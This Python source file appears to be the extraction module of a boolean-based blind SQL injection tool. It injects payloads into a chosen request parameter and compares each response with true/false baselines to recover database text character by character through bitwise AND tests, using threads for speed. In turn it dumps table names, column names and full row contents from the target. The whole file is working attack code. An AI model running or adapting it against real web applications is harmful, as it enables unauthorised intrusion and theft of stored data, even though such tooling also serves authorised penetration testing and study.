#!/usr/bin/python3

import sys
import threading
import concurrent.futures

from colorama import Fore
from urlQuery import sendReq

# SQL-ANDing extraction method
def prepPayloadSQLANDing(params, vulnPoint, payloads, row, extract, pos, x1, x2, tblName=None, clmName=None):
    if extract == "tbls":
        injPayload = payloads.format(row=row, pos=pos, x1=x1, x2=x2)
    elif extract == "clms":
        injPayload = payloads.format(tblName=tblName, row=row, pos=pos, x1=x1, x2=x2)
    elif extract == "info":
        injPayload = payloads.format(clmName=clmName, tblName=tblName, row=row, pos=pos, x1=x1, x2=x2)
    newParams = params.copy()
    newParams[vulnPoint] += injPayload
    return newParams

def boolenTF(url, params, t, f, d):
    r = sendReq(url, data=params, allow_redirects=False) if d else sendReq(url, params=params, allow_redirects=False)
    if r.status_code == 200 and r.status_code != 500 and (t.text == r.text and r.text != f.text):
        return True
    return False

def extractBooleanInfoSQLANDing(url, params, vulnPoint, payload, row, t, f, d, extract, tblName=None, clmName=None):
    x = ''
    pos = 1

    def getCharacters(payload, x1, x2):
        temp = ''
        newParams = prepPayloadSQLANDing(params, vulnPoint, payload, row, extract, pos, x1, x2, tblName=tblName, clmName=clmName)
        if boolenTF(url, newParams, t, f, d):
            temp += str(1)
        else:
            temp += str(0)
        return temp

    tempArr = [128,64,32,16,8,4,2,1]
    with concurrent.futures.ThreadPoolExecutor() as executor:
        while True:
            futures = []
            for i in range(len(tempArr)):
                futures.append(executor.submit(getCharacters, payload, tempArr[i], tempArr[i]))
            results = [future.result() for future in futures]
            tBin = ''.join(results)
            if len(tBin) == 0 or '00000000' in tBin:
                break
            x += chr(int(tBin, 2))
            sys.stdout.write(Fore.GREEN + f"\r[*] Result: {x}" + Fore.RESET)
            pos += 1
    return x

def extractTablesSQLANDing(url, params, vulnPoint, payload, t, f, d):
    row = 0
    tblNames = []
    while True:
        tempTbl = extractBooleanInfoSQLANDing(url, params, vulnPoint, payload, row, t, f, d, extract='tbls')
        if tempTbl:
            print ()
            tblNames.append(tempTbl)
            row += 1
        else:
            break
    return tblNames

def extractColumnsSQLANDing(url, params, vulnPoint, payload, t, f, d, tblNames):
    clmNames = {}
    for tblName in tblNames:
        row = 0
        clmNames[tblName] = []
        while True:
            tempClm = extractBooleanInfoSQLANDing(url, params, vulnPoint, payload, row, t, f, d, extract='clms', tblName=tblName)
            if tempClm:
                print ()
                clmNames[tblName].append(tempClm)
                row += 1
            else:
                break
    return clmNames
    
def extractInfoSQLANDing(url, params, vulnPoint, payload, t, f, d, tblNames, clmNames):
    info = {}
    for tblName in tblNames:
        row = 0
        info[tblName] = []
        while True:
            tempDict = {}
            for clmName in clmNames[tblName]:
                print ()
                tempInfo = extractBooleanInfoSQLANDing(url, params, vulnPoint, payload, row, t, f, d, extract='info', tblName=tblName, clmName=clmName)
                tempDict[clmName] = tempInfo
            if not any(tempDict.values()):
                break
            info[tblName].append(tempDict)
            row += 1
    return info              

def extractSQLAndingMain(url, params, vulnPoint, payload, trueFalsePayloads, d, tbl=None, clm=None):
    t = params.copy()
    f = params.copy()
    t[vulnPoint] += trueFalsePayloads[0]
    f[vulnPoint] += trueFalsePayloads[1]
    rT = sendReq(url, data=t, allow_redirects=False) if d else sendReq(url, params=t, allow_redirects=False)
    rF = sendReq(url, data=f, allow_redirects=False) if d else sendReq(url, params=f, allow_redirects=False)
    info = {}
    tblNames = [tbl] if tbl is not None else extractTablesSQLANDing(url, params, vulnPoint, payload[0], rT, rF, d)
    clmNames = {tbl: clm} if clm is not None else extractColumnsSQLANDing(url, params, vulnPoint, payload[1], rT, rF, d, tblNames)
    info.update(extractInfoSQLANDing(url, params, vulnPoint, payload[2], rT, rF, d, tblNames, clmNames))
    
    if tbl is None and clm is None and info:
        return True, info
    elif tblNames and clmNames and info and any(info.values()):
        return True, info
    else:
        return False, info